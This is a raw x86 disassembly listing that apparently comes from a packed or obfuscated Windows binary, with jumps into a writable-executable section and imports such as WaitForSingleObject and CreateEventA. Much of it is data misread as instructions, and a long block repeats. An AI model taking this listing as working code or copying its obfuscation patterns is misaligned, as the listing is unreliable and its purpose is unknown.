pop esp
not bl
test dh 0x55
xchg ebp eax
daa
clc
mov eax ebp
pushad
add bl ah
mov bl 0x1
sub esp 0xffffffe0
jmp rwxdata
pushad
jmp rwxdata
inc ecx
and esi ebp
je rwxdata
and al 0x45
shl [ edi - 0x64 ] 0x3c
bound edi [ eax + edx * 4 + 0xe ]
out dx eax
xchg [ esi ] ch
lea ecx [ edx ]
mov eax [ 0xffffffffff43e6e3 ]
mov esp 0x4ece65cb
shl [ edx - 0xd ] cl
jb rwxdata
call sub_514a7e
add [ eax ] al
push ecx
jne rwxdata
pushfd
dec ecx
call sub_4baa7e
add [ eax ] al
pop edi
popad
jne rwxdata

test al 0xf7
scasb [ edi ]
retn 0xc088
add eax 0x68b91a8f
jb rwxdata
sub bl [ edx ]
lea ecx [ ebx - 0x74fd2acb ]
rcr [ cs : ebx + 0x1a ] cl
pop eax
rwxdata
insb
jae rwxdata
fwait
mov esi 0x83dc4649
out dx al
adc [ eax - 0x3 ] esi
test eax 0x591e91ca
sbb [ edx - 0x30 ] cl
shl bl 0x1
fiadd [ 0x68b91a8f ]
inc ebp
fcom [ edi - 0xc ]
sar [ ebp - 0x1c ] 0x1
push ebx
jb rwxdata
arpl [ ebp + 0x70 ] bp
add [ eax ] al
add [ ebx + 0x74 ] dh
jb rwxdata
js rwxdata
jb rwxdata
jge rwxdata
imul esp [ ebx + 0x65 ] 0x74617453
jne rwxdata
and al 0x40
je rwxdata
lahf
retn
inc ebx
or cl [ ebx - 0x52 ]
call sub_5149a7
push 0x2ac01081
call sub_518563
inc eax
mov dh [ ebp + 0x348c9c36 ]
shl bl 0x1
fisubr [ esi ]
scasb [ edi ]
cmp eax 0xbe9bb3ec
dec ecx
rcr [ ecx + 0x68dee75f ] 0xcc
dec esi
0xcdb4
add [ ebp + 0xf102464 ] cl
xchg ecx esp
xchg ebx eax
sti
jmp rwxdata
jmp rwxdata
and al 0x40
add [ eax - 0x2 ] ah
enter 0x9f0f 0xc3
pushad
ror bl cl
mov [ esp + 0x8 ] 0x24
ror al 0x6
pushfd
push 0x3db5ced4
stosb [ edi ]
mov bl ch
mov bl 0x2
lea esp [ esp + 0x4c ]
pushad
pushfd
lea esp [ esp + 0x24 ]
call sub_514aff
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jae rwxdata
mov bl 0x4a
setb bl
mov bl al
inc ecx
mov al ch
mov al cl
lodsb [ esi ]
not bl
cmc
not al
jmp rwxdata
pushfd
pushfd
stc
sub ecx ecx
jmp rwxdata
ror al 0x2
call sub_515d7b
add [ eax ] al
pop edi
imul ebp [ edi + 0x62 ] 0x7ae96000
lea esp [ esp + 0x8 ]
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
pushad
lea esp [ esp + 0x20 ]
call sub_516816
push 0x2f36ccdf
push ebx
sub ecx ebx
push [ esp ]
call sub_514f1a
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x466c6175
jb rwxdata
call sub_4ba562
pushfd
call sub_514bca
add [ eax ] al
push edx
jo rwxdata
add [ eax ] al
add al al
add [ edx + esi * 8 + 0x14 ] esp
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
scasb [ edi ]
mov cl dh
loopne rwxdata
inc ebp
js rwxdata
add al 0xae
jb rwxdata
sub al 0x4
add [ eax ] al
loopne rwxdata
pop ecx
aas
or al 0x0
add [ eax ] al
add dh al
or esi ebx
adc [ fs : edx + 0x3f ] 0x58
add [ eax ] eax
add [ eax + 0xc ] dl
mov edi edx
sub al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
add [ edi + 0x2264fcdc ] ah
pop ecx
aas
clc
push eax
push [ esp + 0x4 ]
xchg [ esp + 0x8 ] ebp
sub bp dx
shl ebp cl
lea ebp [ esp + 0x8 ]
stc
push [ esp ]
bt esi 0x2
cmp esp ecx
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] 0x6b
mov [ esp + 0x4 ] ebx
cmc
bt dx 0x1
or eax eax
call sub_4d126d
lodsb [ esi ]
pushfd
not al
clc
jmp rwxdata
lea eax [ 0x0 ]
mov [ esp ] 0x35
mov [ esp + 0x3c ] rwxdata
jmp rwxdata
pop [ esp + 0x1c ]
pushad
push [ esp ]
jmp rwxdata
clc
inc ebp
jbe rwxdata
inc ebx
aas
out 0x0 eax
add [ eax ] al
jmp rwxdata
salc
clc
hlt
cmc
mov [ esp ] 0x4a54
ror al 0x2
mov [ esp + 0x4 ] bh
dec al
jmp rwxdata
push 0x21193420
call sub_4ba009
add [ eax ] al
inc ebx
jb rwxdata
xchg [ eax - 0x64 ] bl
and [ esi - 0x39 ] ah
inc esp
and al 0x4
scasb [ edi ]
outsb
je rwxdata
jbe rwxdata
cmc
cmc
stc
ror al 0x6
lea esp [ esp + 0x2c ]
jne rwxdata
add [ ebx - 0x5afb46d0 ] ch
jo rwxdata
cdq
xlat
movsb [ edi ] [ esi ]
neg [ ecx - 0x279cc9c7 ]
add [ eax ] al
ja rwxdata
add al ch
out dx al
mov dl 0xfb
jmp [ esi - 0x39 ]
add [ eax ] cl
xor eax 0x7d9bf9ac
lodsd [ esi ]
shl al 0x7c
in al dx
je rwxdata
pop esi
aas
or [ esp + eax ] 0x7
dec ebx
out 0xf2 eax
mov bl 0xf3
inc ebx
aas
cmp eax 0x90000008
pop ss
sub al 0xf1
loopne rwxdata
call sub_4cfe42
mov [ esp ] 0x4e50
add dl dl
lea esp [ esp + 0x4 ]
js rwxdata
call j_sub_51680a
pushfd
mov [ esp ] 0xc4ad
cmp eax 0x7d00
pushfd
pushad
lea esp [ esp + 0x28 ]
jae rwxdata
jmp rwxdata
outsb
inc esp
arpl [ gs : edx + 0x79 ] si
jo rwxdata
je rwxdata
jae rwxdata
mov es sp
pop ss
add eax 0x830ad99d
xchg edi eax
cwde
mov al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
inc ecx
idiv ch
leave
inc ebx
aas
jmp rwxdata
pushfd
push [ esp ]
push 0x42e22958
lea esp [ esp + 0xc ]
jne rwxdata
stc
pushfd
call sub_4cd0f5
sub [ ebp - 0x282051e4 ] bh
in al dx
xchg edx eax
stosd [ edi ]
xor [ ecx + 0x32f1a504 ] bh
int1
xor ah [ eax - 0x51a37b79 ]
add al 0xa5
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
je rwxdata
popad
jo rwxdata
je rwxdata
xor al 0xfd
movsd [ edi ] [ esi ]
dec esi
push edi
div [ 0x69d36210 ]
fsubr [ ebp - 0x5809edc ]
mov ecx 0xa2c3bbf9
enter 0x5d3f 0x2f
test edx 0xeb93f012
mov ch 0x27
push 0xffffffda
add [ eax ] al
imul esi [ ebx + 0x73 ] 0x65636170
add [ 0x7f ] bh
push ecx
pushfd
call sub_4d11bc
add [ eax ] al
pop edi
popad
insb
insb
imul esi [ fs : esi ] 0x52c3980f
mov bl 0x2
push 0xe370dce6
push eax
jmp rwxdata
mov [ 0xfffffffff274f6d5 ] al
sub bh [ cs : edi ]
jle rwxdata
add [ eax ] al
add ah ah
inc ebp
xor al [ fs : ebx + 0x3f ]
add [ edx ] al
add [ eax ] al
loopne rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
pushfd
push [ esp + 0x4 ]
retn 0x8
jmp rwxdata
inc ebx
push edx
push esp
insb
imul ebp [ esi + 0x64 ] 0x4473776f
imul esi [ edx + 0x65 ] 0x726f7463
jns rwxdata
mov ah 0x5a
0xaf298232 0x972a
into
sub ebx esi
0xa7d209b5 0x53f4
jb rwxdata
add [ eax ] al
add [ edi + 0x65 ] al
pop edi
je rwxdata
out 0x42 al
in eax 0x54
test [ ebx ] eax
js rwxdata
add [ eax ] al
add [ ebx + 0x70 ] dh
jb rwxdata
inc ecx
push [ esp + 0x8 ]
pushfd
mov al 0x10
pushfd
jmp rwxdata
inc edx
sahf
imul [ ebp + 0x1d88a34f ]
nop
jo rwxdata
push cs
je rwxdata
or [ eax ] al
add [ eax ] al
in al 0x45
mov edi ebx
nop
stc
inc ebx
aas
test [ ebx ] 0x0
add [ eax + 0x38f2d8fc ] ah
pop ecx
aas
or al 0x0
add [ eax ] al
add dl ch
pop esi
stc
enter 0x5926 0x3f
or al 0x0
add [ eax ] al
inc eax
lds edi [ edx - 0x7 ]
cmp [ ebx + 0x3c3f52 ] al
add [ eax ] al
xor [ edx - 0x6 ] dl
cld
les eax [ ebx + 0x1483f52 ]
add [ eax ] al
pushad
pushf
pop [ esp + 0x1e ]
pushfd
not dl
rcl dl cl
mov dl [ esi ]
jmp rwxdata
call sub_5160c0
fdivr [ eax - 0x29 ]
pop ebp
0x2c6efc40 0xba31
int3
jbe rwxdata
lodsd [ esi ]
add eax 0x56534d00
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
mov esp 0x830d700a
and cl ch
jmp rwxdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
jo rwxdata
scasd [ edi ]
sub dl [ edi - 0x150cd632 ]
mov ch 0x9
shl [ edi + 0x482053f4 ] cl
xor eax 0xc663e665
jpo rwxdata
inc ebx
add [ ebp + 0x5 ] cl
add dh al
add al 0x24
xor eax 0x3c2444c7
xor ch [ eax + 0x51 ]
add cl ch
inc edi
pop esp
cli
dec [ ebx - 0x14 ]
inc edi
0x859c
add [ eax ] al
jo rwxdata
jae rwxdata
test ecx ecx
rcl [ 0x2b41ffdc ] cl
cmp eax 0xf8ddff8a
mov ebp 0x64e42207
0xd9ba
hlt
outsb
je rwxdata
mov [ esp + 0x4 ] ch
pushad
pop ecx
aas
or al 0x0
add [ eax ] al
shr dl 0x34
clc
pushfd
cli
push ebp
lahf
adc ecx ebx
into
pop edx
test [ edi + 0x4086c7ea ] eax
js rwxdata
not dl
mov [ esp ] 0x7
ror dl 0x2
pushfd
push 0xe79e7e8c
dec dl
bt sp bx
clc
push [ esp + 0x8 ]
ror dl 0x6
std
bt ax bx
cmc
push [ esp + 0x2e ]
popf
pushfd
mov [ esp ] 0x3f
inc esi
jmp rwxdata
mov bl 0x2
push 0xbc73fcd6
push 0xb25f2b2b
inc al
inc ecx
jmp rwxdata
je rwxdata
outsb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
insb
jbe rwxdata
je rwxdata
jpe rwxdata
je rwxdata
add [ ecx ] edi
add [ esi + 0x70 ] ah
jne rwxdata
add cl dl
push edi
shr [ eax - 0x31 ] 0x40
jb rwxdata
push [ ebp - 0x8 ]
add [ eax - 0x77 ] ah
inc esp
and al 0x20
mov [ esp + 0x4 ] 0x86ae
pop eax
pushfd
outsb
inc esp
jae rwxdata
jb rwxdata
sub bh [ edi ]
rol [ ecx ] 0x15
adc dl dl
mov [ esp ] bl
pushfd
push esp
pushfd
push [ esp + 0x40 ]
retn 0x44
pushad
jmp rwxdata
jae rwxdata
arpl [ ebp + 0x43 ] sp
popad
jo rwxdata
call sub_514aff
jmp rwxdata
add al 0x51
add [ edi + 0x18 ] eax
imul esi [ 0x24648db4 ] 0x8
inc ecx
xor [ ebx - 0x50c87ee4 ] eax
sub ch cl
mov esp 0xbcaf27cd
or cl al
cdq
popfd
sbb ch bl
xchg edi eax
je rwxdata
arpl [ eax ] ax
add [ eax ] al
inc edi
je rwxdata
0xda80
je rwxdata
mov al 0x10
call sub_515d53
add [ eax ] al
jae rwxdata
outsd
pushfd
adc [ edx ] esi
xchg esi eax
imul edx ecx 0xa7c254e0
in al 0xcf
je rwxdata
xchg ecx eax
add [ ecx + ebp - 0x1 ] edi
add [ eax ] al
add [ esi + 0x66 ] ah
insb
jne rwxdata
setae [ 0xffffffffa81b6c87 ]
test [ ecx ] edi
fmul [ ecx - 0x7ed456cd ]
sahf
push ss
scasd [ edi ]
shr esp 0x1
or [ ecx + 0x3a ] esp
jo rwxdata
out dx al
adc [ eax ] eax
add [ edi - 0x77 ] dl
iretd
jb rwxdata
scasb [ edi ]
add [ ebp + 0x7c019132 ] bl
sub edi edi
add al ch
or [ ebp + 0x534d0005 ] ebp
push esi
mov al [ 0xffffffffae5c8487 ]
dec ebp
aam 0x91
hlt
aad 0x4d
lea esp [ esp + 0x38 ]
call sub_514aff
pushad
adc al al
call sub_4ba21b
add [ eax ] al
dec edi
jo rwxdata
push 0x246c8800
add al 0x60
push eax
sbb cl [ esi - 0x29 ]
sahf
cwde
shr [ ebp + 0x32 ] 0x2c
imul edx [ esi - 0x80 ] 0xffffffd7
or [ ebx ] eax
jne rwxdata
dec esp
cmp ecx [ edx + 0x20 ]
imul eax [ ecx + edx * 2 ] 0x1
inc edi
sbb [ ebx + 0x35 ] ch
mov ah 0x8d
and al 0x8
pop ds
add [ eax ] al
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
jo rwxdata
jpe rwxdata
call sub_515ff7
lea edi [ ecx + 0x791c83a5 ]
and al 0x4
add [ eax ] al
add [ esi + 0x69 ] dl
jb rwxdata
je rwxdata
jns rwxdata
jne rwxdata
das
sahf
add eax 0x63fb557b
cwde
and al 0xa9
sub [ ebx - 0x78b248b7 ] 0x4409
cmp eax 0x7fb6fd05
popad
add al 0x78
outsd
insb
jne rwxdata
sbb ch [ ecx ]
pslld mm7 [ esi ]
add eax 0x3776657f
test al 0x87
inc ecx
inc eax
push ss
ja rwxdata
je rwxdata
test [ edi ] ebx
insb
push eax
jb rwxdata
inc ecx
add [ ebx - 0x21 ] dl
jne rwxdata
insd
add cl ch
mov dh 0x19
add esp eax
push esi
std
jle rwxdata
add [ eax ] al
insd
push esp
imul ebp [ ebp + 0x65 ] 0x19b6e900
mov edi [ esp + 0x8 ]
call sub_5160ed
add [ eax ] al
inc edi
je rwxdata
mov ecx 0x791c83a5
je rwxdata
jb rwxdata
jbe rwxdata
cmp edi [ ecx - 0x6278c946 ]
je rwxdata
retn 0xd248
push edi
mov edi ecx
mov ebx [ esp + 0x4 ]
arpl [ eax + eax + 0x66 ] si
adc esi edx
btc ax 0x1
aaa
mov esi edi
add ah 0xd5
shld eax ebx 0x15
mov eax [ edx + 0xc ]
call sub_4ba26d
jmp rwxdata
popad
insd
inc ecx
add [ eax + 0x72 ] ch
sbb al 0x13
ja rwxdata
dec eax
pop edi
pop edi
je rwxdata
adc eax 0x4d9c0a5a
in eax dx
std
dec eax
popad
jae rwxdata
sbb al 0xfb
adc [ eax ] eax
xor [ ecx + edx ] bl
cmc
test al 0xb
add [ ecx - 0x60 ] dh
or eax [ eax ]
sub [ ebp + 0x5caf000b ] esp
adc [ eax ] eax
test [ edi + 0x11 ] dh
add bh ch
pop esp
adc [ eax ] eax
outsb
dec esi
adc [ eax ] eax
aam 0xa6
or eax [ eax ]
mov [ ecx + edx ] ch
in al dx
push esp
adc [ eax ] eax
mov [ esi + 0x46b6000b ] fs
adc [ eax ] eax
out dx eax
mov [ 0x6304000b ] eax
adc [ eax ] eax
inc edi
mov al [ 0xffffffffa40d000b ]
or eax [ eax ]
mov eax 0x3e001164
push 0xab0e0011
or eax [ eax ]
and eax 0x5a00115e
jl Heap32ListFirst@IAT
popad
imul ebp [ esi + 0x61 ] 0x736772
push 0x1ac010d0
call sub_518ef7
cmp al 0x30
std
0xfdc0953a 0x7610
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
cli
arpl [ ecx ] dx
add [ ebp + 0x64 ] cl
adc [ eax ] eax
popad
mov al [ 0x6435000b ]
adc [ eax ] eax
cmp ebp [ esi + 0x11 ]
add [ ecx + edi * 2 + 0x560b0011 ] dh
adc [ eax ] eax
das
jge GetSystemTime@IAT
add [ ecx + 0x56 ] al
adc [ eax ] eax
pop edi
adc [ eax ] ax
and [ edx + 0x6b06000b ] 0x11
add dl bh
xor ah [ esi - 0x5a ]
int3
jae rwxdata
pop ds
dec esi
adc [ eax ] eax
mov eax [ 0x6b000ba6 ]
mov [ 0xfffffffffed3000b ] eax
or al 0x0
xlat
mov [ 0x11ee000b ] eax
or eax 0x11662600
add bh al
pop ecx
adc [ eax ] eax
adc al 0x5a
adc [ eax ] eax
lds esp [ eax + 0x11 ]
add [ ebx - 0x2affeeac ] bh
pushad
adc [ eax ] eax
dec esi
ror [ eax + eax ] 0x1
push cs
stosb [ edi ]
or eax [ eax ]
cmp [ ebx + 0x75f2000b ] ebp
adc [ eax ] eax
add al 0x7d
adc [ eax ] eax
aas
mov [ 0x7759000b ] al
adc [ eax ] eax
mov eax 0x85000ba6
into
add [ esp ] cl
adc [ eax ] eax
jg rwxdata
jbe rwxdata
jb rwxdata
add [ ecx + 0x11 ] ebx
add [ edx ] ch
dec [ eax + eax ]
add [ eax + 0x29001153 ] ah
push esp
adc [ eax ] eax
pop edx
test eax 0x5933000b
adc [ eax ] eax
js WaitForSingleObject@IAT
add [ ebp - 0x28fff332 ] al
adc [ eax ] eax
lodsd [ esi ]
movsd [ edi ] [ esi ]
or eax [ eax ]
je CreateEventA@IAT
je __import_name_6(MSVCRT:__getmainargs)
mov ecx 0x9d8736ba
push esp
add [ eax ] dl
inc ebx
or al 0x0
xlat
or eax [ eax ]
hlt
cmp [ esi + 0x11 ] edx
add cl al
adc [ 0x115c3e00 ] ecx
add [ edx - 0x2f ] al
or al 0x0
aaa
test al 0xb
add [ edx + 0x5a ] dh
adc [ eax ] eax
cmp dh [ ecx + 0x11 ]
add [ eax ] al
add [ eax ] al
add ch cl
arpl [ ecx ] dx
add [ eax + 0x76001177 ] ch
dec esp
adc [ eax ] eax
pop ecx
adc [ eax ] eax
mov [ esi + 0x11 ] gs
add [ ebx + ecx * 2 ] al
adc [ eax ] eax
jg rwxdata
xor ebx [ ecx + 0x11 ]
add [ ecx ] al
pop ecx
adc [ eax ] eax
sub bh bh
or al 0x0
adc [ eax ] eax
sub_4d126d
pushad
pushfd
lea esp [ esp + 0x2c ]
je rwxdata
not bl
not cx
push esi
pushfd
mov ebx [ esp + 0x8 ]
mov [ esp + 0x4 ] bh
setns cl
mov ecx [ esp + 0xc ]
pushfd
call j_sub_4cfe36
sar si 0xa
stc
rcl si 0x5
shrd si dx cl
mov esi edx
bsr dx cx
neg dl
mov dl bh
neg dh
mov edx eax
call sub_5168f2
mov ebx [ esi ]
bt esp 0x10
clc
stc
clc
and ebx 0xfff
cmp ah 0x4e
pushfd
stc
clc
add [ edi + ebx ] edx
sub esp 0xfffffff8
cmp dh ah
bt ax ax
add esi 0x2
jmp rwxdata
imul ebp [ edi + 0x73 ] 0x5ce06100
cmc
fidiv [ ebp - 0x3914778 ]
pop esp
pushad
jmp rwxdata
inc ecx
and esi ebp
je rwxdata
and al 0x45
shl [ edi - 0x64 ] 0x3c
bound edi [ eax + edx * 4 + 0xe ]
out dx eax
xchg [ esi ] ch
lea ecx [ edx ]
mov eax [ 0xffffffffff43e6e3 ]
mov esp 0x4ece65cb
shl [ edx - 0xd ] cl
jb rwxdata
pushfd
dec ecx
call sub_4baa7e
add [ eax ] al
pop edi
popad
jne rwxdata

test al 0xf7
scasb [ edi ]
retn 0xc088
sub bl [ edx ]
lea ecx [ ebx - 0x74fd2acb ]
rcr [ cs : ebx + 0x1a ] cl
pop eax
rwxdata
insb
jae rwxdata
arpl [ ebp + 0x70 ] bp
add [ eax ] al
add [ ebx + 0x74 ] dh
jb rwxdata
js rwxdata
jb rwxdata
and al 0x40
je rwxdata
lahf
retn
inc ebx
or cl [ ebx - 0x52 ]
call sub_5149a7
push 0x2ac01081
call sub_518563
jmp rwxdata
jmp rwxdata
and al 0x40
add [ eax - 0x2 ] ah
enter 0x9f0f 0xc3
pushad
ror bl cl
mov [ esp + 0x8 ] 0x24
ror al 0x6
pushfd
push 0x3db5ced4
stosb [ edi ]
mov bl ch
mov bl 0x2
lea esp [ esp + 0x4c ]
pushad
pushfd
lea esp [ esp + 0x24 ]
call sub_514aff
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jae rwxdata
mov bl 0x4a
setb bl
mov bl al
inc ecx
push esi
dec bl
pushfd
inc ecx
add esp 0x8
not bl
test dh 0x55
xchg ebp eax
daa
clc
mov eax ebp
pushad
add bl ah
mov bl 0x1
sub esp 0xffffffe0
mov al ch
mov al cl
lodsb [ esi ]
not bl
cmc
not al
jmp rwxdata
pushfd
pushfd
stc
sub ecx ecx
jmp rwxdata
cmp di 0xba02
cmp si sp
push esi
ror si cl
pushad
mov esi edi
call sub_51578e
add [ eax ] al
dec esi
je rwxdata
push 0xf9efd1ed
mov [ esp ] bp
pushad
mov [ esp + 0x20 ] esi
shr esi cl
lea esi [ eax * 2 - 0x2888c866 ]
mov esi edi
push [ esp ]
call sub_515aa3
ror al 0x2
call sub_515d7b
add [ eax ] al
pop edi
imul ebp [ edi + 0x62 ] 0x7ae96000
lea esp [ esp + 0x8 ]
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
pushad
lea esp [ esp + 0x20 ]
call sub_516816
push 0x2f36ccdf
push ebx
sub ecx ebx
push [ esp ]
call sub_514f1a
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x466c6175
jb rwxdata
call sub_4ba562
pushfd
call sub_514bca
add [ eax ] al
push edx
jo rwxdata
add [ eax ] al
add al al
add [ edx + esi * 8 + 0x14 ] esp
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
scasb [ edi ]
mov cl dh
loopne rwxdata
inc ebp
js rwxdata
add al 0xae
jb rwxdata
sub al 0x4
add [ eax ] al
loopne rwxdata
pop ecx
aas
or al 0x0
add [ eax ] al
add dh al
or esi ebx
adc [ fs : edx + 0x3f ] 0x58
add [ eax ] eax
add [ eax + 0xc ] dl
mov edi edx
sub al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
add [ edi + 0x2264fcdc ] ah
pop ecx
aas
clc
push eax
push [ esp + 0x4 ]
xchg [ esp + 0x8 ] ebp
sub bp dx
shl ebp cl
lea ebp [ esp + 0x8 ]
stc
push [ esp ]
bt esi 0x2
cmp esp ecx
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] 0x6b
mov [ esp + 0x4 ] ebx
cmc
bt dx 0x1
or eax eax
call sub_4d126d
lodsb [ esi ]
pushfd
not al
clc
jmp rwxdata
lea eax [ 0x0 ]
mov [ esp ] 0x35
mov [ esp + 0x3c ] rwxdata
jmp rwxdata
pop [ esp + 0x1c ]
pushad
push [ esp ]
jmp rwxdata
clc
inc ebp
jbe rwxdata
inc ebx
aas
out 0x0 eax
add [ eax ] al
jmp rwxdata
salc
clc
hlt
cmc
mov [ esp ] 0x4a54
ror al 0x2
mov [ esp + 0x4 ] bh
dec al
jmp rwxdata
push 0x21193420
call sub_4ba009
add [ eax ] al
inc ebx
jb rwxdata
xchg [ eax - 0x64 ] bl
and [ esi - 0x39 ] ah
inc esp
and al 0x4
scasb [ edi ]
outsb
je rwxdata
jbe rwxdata
cmc
cmc
stc
ror al 0x6
lea esp [ esp + 0x2c ]
jne rwxdata
add [ ebx - 0x5afb46d0 ] ch
jo rwxdata
cdq
xlat
movsb [ edi ] [ esi ]
neg [ ecx - 0x279cc9c7 ]
add [ eax ] al
ja rwxdata
add al ch
out dx al
mov dl 0xfb
jmp [ esi - 0x39 ]
add [ eax ] cl
xor eax 0x7d9bf9ac
lodsd [ esi ]
shl al 0x7c
in al dx
je rwxdata
pop esi
aas
or [ esp + eax ] 0x7
dec ebx
out 0xf2 eax
mov bl 0xf3
inc ebx
aas
cmp eax 0x90000008
pop ss
sub al 0xf1
loopne rwxdata
call sub_4cfe42
mov [ esp ] 0x4e50
add dl dl
lea esp [ esp + 0x4 ]
js rwxdata
call j_sub_51680a
pushfd
mov [ esp ] 0xc4ad
cmp eax 0x7d00
pushfd
pushad
lea esp [ esp + 0x28 ]
jae rwxdata
jmp rwxdata
outsb
inc esp
arpl [ gs : edx + 0x79 ] si
jo rwxdata
je rwxdata
jae rwxdata
mov es sp
pop ss
add eax 0x830ad99d
xchg edi eax
cwde
mov al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
inc ecx
idiv ch
leave
inc ebx
aas
jmp rwxdata
pushfd
push [ esp ]
push 0x42e22958
lea esp [ esp + 0xc ]
jne rwxdata
stc
pushfd
call sub_4cd0f5
sub [ ebp - 0x282051e4 ] bh
in al dx
xchg edx eax
stosd [ edi ]
xor [ ecx + 0x32f1a504 ] bh
int1
xor ah [ eax - 0x51a37b79 ]
add al 0xa5
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
je rwxdata
popad
jo rwxdata
je rwxdata
xor al 0xfd
movsd [ edi ] [ esi ]
dec esi
push edi
div [ 0x69d36210 ]
fsubr [ ebp - 0x5809edc ]
mov ecx 0xa2c3bbf9
enter 0x5d3f 0x2f
test edx 0xeb93f012
mov ch 0x27
push 0xffffffda
add [ eax ] al
imul esi [ ebx + 0x73 ] 0x65636170
add [ 0x7f ] bh
push ecx
pushfd
call sub_4d11bc
add [ eax ] al
pop edi
popad
insb
insb
imul esi [ fs : esi ] 0x52c3980f
mov bl 0x2
push 0xe370dce6
push eax
jmp rwxdata
mov [ 0xfffffffff274f6d5 ] al
sub bh [ cs : edi ]
jle rwxdata
add [ eax ] al
add ah ah
inc ebp
xor al [ fs : ebx + 0x3f ]
add [ edx ] al
add [ eax ] al
loopne rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
pushfd
push [ esp + 0x4 ]
retn 0x8
jmp rwxdata
inc ebx
push edx
push esp
insb
imul ebp [ esi + 0x64 ] 0x4473776f
imul esi [ edx + 0x65 ] 0x726f7463
jns rwxdata
mov ah 0x5a
0xaf298232 0x972a
into
sub ebx esi
0xa7d209b5 0x53f4
jb rwxdata
add [ eax ] al
add [ edi + 0x65 ] al
pop edi
je rwxdata
out 0x42 al
in eax 0x54
test [ ebx ] eax
js rwxdata
add [ eax ] al
add [ ebx + 0x70 ] dh
jb rwxdata
inc ecx
push [ esp + 0x8 ]
pushfd
mov al 0x10
pushfd
jmp rwxdata
inc edx
sahf
imul [ ebp + 0x1d88a34f ]
nop
jo rwxdata
push cs
je rwxdata
or [ eax ] al
add [ eax ] al
in al 0x45
mov edi ebx
nop
stc
inc ebx
aas
test [ ebx ] 0x0
add [ eax + 0x38f2d8fc ] ah
pop ecx
aas
or al 0x0
add [ eax ] al
add dl ch
pop esi
stc
enter 0x5926 0x3f
or al 0x0
add [ eax ] al
inc eax
lds edi [ edx - 0x7 ]
cmp [ ebx + 0x3c3f52 ] al
add [ eax ] al
xor [ edx - 0x6 ] dl
cld
les eax [ ebx + 0x1483f52 ]
add [ eax ] al
pushad
pushf
pop [ esp + 0x1e ]
pushfd
not dl
rcl dl cl
mov dl [ esi ]
jmp rwxdata
call sub_5160c0
fdivr [ eax - 0x29 ]
pop ebp
0x2c6efc40 0xba31
int3
jbe rwxdata
lodsd [ esi ]
add eax 0x56534d00
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
mov esp 0x830d700a
and cl ch
jmp rwxdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
jo rwxdata
scasd [ edi ]
sub dl [ edi - 0x150cd632 ]
mov ch 0x9
shl [ edi + 0x482053f4 ] cl
xor eax 0xc663e665
jpo rwxdata
inc ebx
add [ ebp + 0x5 ] cl
add dh al
add al 0x24
xor eax 0x3c2444c7
xor ch [ eax + 0x51 ]
add cl ch
inc edi
pop esp
cli
dec [ ebx - 0x14 ]
inc edi
0x859c
add [ eax ] al
jo rwxdata
jae rwxdata
test ecx ecx
rcl [ 0x2b41ffdc ] cl
cmp eax 0xf8ddff8a
mov ebp 0x64e42207
0xd9ba
hlt
outsb
je rwxdata
mov [ esp + 0x4 ] ch
pushad
pop ecx
aas
or al 0x0
add [ eax ] al
shr dl 0x34
clc
pushfd
cli
push ebp
lahf
adc ecx ebx
into
pop edx
test [ edi + 0x4086c7ea ] eax
js rwxdata
not dl
mov [ esp ] 0x7
ror dl 0x2
pushfd
push 0xe79e7e8c
dec dl
bt sp bx
clc
push [ esp + 0x8 ]
ror dl 0x6
std
bt ax bx
cmc
push [ esp + 0x2e ]
popf
pushfd
mov [ esp ] 0x3f
inc esi
jmp rwxdata
mov bl 0x2
push 0xbc73fcd6
push 0xb25f2b2b
inc al
inc ecx
jmp rwxdata
je rwxdata
outsb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
insb
jbe rwxdata
je rwxdata
jpe rwxdata
je rwxdata
add [ ecx ] edi
add [ esi + 0x70 ] ah
jne rwxdata
add cl dl
push edi
shr [ eax - 0x31 ] 0x40
jb rwxdata
push [ ebp - 0x8 ]
add [ eax - 0x77 ] ah
inc esp
and al 0x20
mov [ esp + 0x4 ] 0x86ae
pop eax
pushfd
outsb
inc esp
jae rwxdata
jb rwxdata
sub bh [ edi ]
rol [ ecx ] 0x15
adc dl dl
mov [ esp ] bl
pushfd
push esp
pushfd
push [ esp + 0x40 ]
retn 0x44
pushad
jmp rwxdata
jae rwxdata
arpl [ ebp + 0x43 ] sp
popad
jo rwxdata
call sub_514aff
jmp rwxdata
add al 0x51
add [ edi + 0x18 ] eax
imul esi [ 0x24648db4 ] 0x8
inc ecx
xor [ ebx - 0x50c87ee4 ] eax
sub ch cl
mov esp 0xbcaf27cd
or cl al
cdq
popfd
sbb ch bl
xchg edi eax
je rwxdata
arpl [ eax ] ax
add [ eax ] al
inc edi
je rwxdata
0xda80
je rwxdata
mov al 0x10
call sub_515d53
add [ eax ] al
jae rwxdata
outsd
pushfd
adc [ edx ] esi
xchg esi eax
imul edx ecx 0xa7c254e0
in al 0xcf
je rwxdata
xchg ecx eax
add [ ecx + ebp - 0x1 ] edi
add [ eax ] al
add [ esi + 0x66 ] ah
insb
jne rwxdata
setae [ 0xffffffffa81b6c87 ]
test [ ecx ] edi
fmul [ ecx - 0x7ed456cd ]
sahf
push ss
scasd [ edi ]
shr esp 0x1
or [ ecx + 0x3a ] esp
